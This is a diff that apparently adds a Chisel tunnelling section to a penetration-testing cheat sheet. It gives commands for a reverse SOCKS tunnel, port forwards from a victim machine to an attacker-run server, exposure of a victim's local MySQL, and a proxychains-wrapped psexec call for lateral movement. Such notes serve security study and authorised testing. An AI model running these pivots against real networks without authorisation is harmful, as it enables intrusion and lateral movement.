@@ -134,3 +134,48 @@ FTP
 ftp 192.168.119.2
 mget *
 ```
+
+# Tunneling
+
+## Chisel
+
+Download https://github.com/jpillora/chisel/releases
+
+Run on attacker machine, chisel listens on port 10000
+
+```bash
+chisel server -p 10000 --reverse
+```
+
+Dynamic Port Forwarding
+
+```powershell
+# On victim machine, connect to chisel server and opens a SOCKS tunnel on port 5000
+# So that attacker can access any network/service that victim machine can access
+chisel client 192.168.45.145:10000 R:5000:socks
+
+# Configure proxychain.conf to use the SOCKS tunnel
+socks5 127.0.0.1 5000
+
+proxychains -f proxychain.conf -q impacket-psexec 10.10.78.142 ...
+```
+
+Individual port forwarding
+
+```powershell
+# A HTTP server is running on attacker machine on port 80
+# On victim machine, connect to chisel server and forward attacker machine port 80 to 127.0.0.1 port 10080
+# Other compromised machines can reach victim machine on port 10080 which accesses attacker machine port 80.
+
+chisel client 192.168.45.145:10000 10080:127.0.0.1:80/tcp
+```
+
+Reverse individual port forwarding
+
+```powershell
+# A mysql service on victim machine is listening on 127.0.0.1
+# On victim machine, connect to chisel server and forward 127.0.0.1:3306 to attacker machine port 13306
+# Attacker can target mysql service on attacker machine port 13306
+
+chisel client 192.168.45.145:10000 R:13306:127.0.0.1:3306/tcp
+```
